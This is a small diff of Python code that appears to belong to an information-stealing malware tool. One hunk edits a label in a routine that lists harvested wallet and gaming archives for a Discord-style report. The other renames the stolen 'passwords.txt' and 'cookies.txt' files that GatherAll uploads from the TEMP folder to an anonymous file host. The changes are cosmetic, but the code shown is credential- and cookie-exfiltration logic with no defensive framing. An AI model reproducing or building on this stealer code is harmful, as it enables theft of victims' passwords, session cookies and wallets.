@@ -613,7 +613,7 @@ def GatherZips(paths1, paths2, paths3):
         for i in WalletsZip:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(WalletsZip) == 0:
-        ga = "<a:8593blackstar:1042395444606672927>  •  Gaming:\n"
+        ga = "<a:8593blackstar:1042395444606672927>  •  Gaming\n"
         for i in GamingZip:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(OtherZip) == 0:
@@ -782,7 +782,7 @@ def GatherAll():
     global upths
     upths = []
 
-    for file in ["wppassw.txt", "wpcook.txt"]: 
+    for file in ["passwords.txt", "cookies.txt"]: 
         # upload(os.getenv("TEMP") + "\\" + file)
         upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
